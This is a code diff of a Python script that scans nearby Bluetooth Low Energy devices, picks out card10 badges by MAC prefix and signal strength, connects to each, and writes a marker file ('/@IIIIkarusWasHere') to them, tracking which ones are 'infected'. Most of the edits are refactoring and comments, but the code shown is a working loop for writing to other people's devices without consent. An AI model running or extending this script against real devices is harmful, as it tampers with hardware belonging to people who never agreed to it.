@@ -11,9 +11,6 @@ from time import sleep
 
 
 # Config.
-OPEN_OR_CREATE_FILE = b's'
-WRITE_FILE          = b'c'
-SAVE_FILE           = b'f'
 FILE_NAME           = b"/@IIIIkarusWasHere"  # limited to about 18 chars.
 SCAN_TIME           = 3.0
 MINIMUM_RSSI        = -85
@@ -23,7 +20,10 @@ DEBUG               = True
 
 
 # Global vars. Yes, I know they are ugly...
-connection_error = False
+OPEN_OR_CREATE_FILE = b's'
+WRITE_FILE          = b'c'
+SAVE_FILE           = b'f'
+connection_error    = False
 
 
 # Show output if DEBUG is True.
@@ -41,7 +41,7 @@ def scan():
     return devices
 
 
-# Connect to addr using peripheral.
+# Connect to addr using peripheral (will be called in a thread).
 def connect(peripheral, addr):
     global connection_error
     try:
@@ -93,8 +93,9 @@ def infect(dev):
         # Sleep is needed if the device was already paired (e.g. to a mobile phone) before.
         # Without the sleep the file will not be saved. I don't know why...
         sleep(0.1)
+        # Writing files in this way caused weird errors. I haven't checked why.
         #data = WRITE_FILE + b"test"
-        # characteristic.write(data)
+        #characteristic.write(data)
         data = SAVE_FILE
         characteristic.write(data)
         log(f"[+] File written to {dev.addr}.", True)
@@ -117,19 +118,20 @@ try:
             # Is device close enough?
             if dev.rssi < MINIMUM_RSSI:
                 continue
-            # Had the device a card10 MAC? (ca:4d:10:xx:xx:xx)?
+            # Is it a card10 MAC? (ca:4d:10:xx:xx:xx)?
             if dev.addr[:8] != "ca:4d:10":
                 continue
             # Is the device already infected?
             if dev.addr in infected_devices:
                 continue
-            # Infect (in thread to reduce connection timeout).
+            # Infect.
             if infect(dev):
                 infected_devices.append(dev.addr)
 except KeyboardInterrupt:
     print("")
     log("[*] Shutting down.")
 except BTLEManagementError:
+    # Might be triggered because your OS shuts down the power to the BLE controller.
     log("[-] Bluetooth interface is powered down.", True)
 finally:
     if len(infected_devices) > 0:
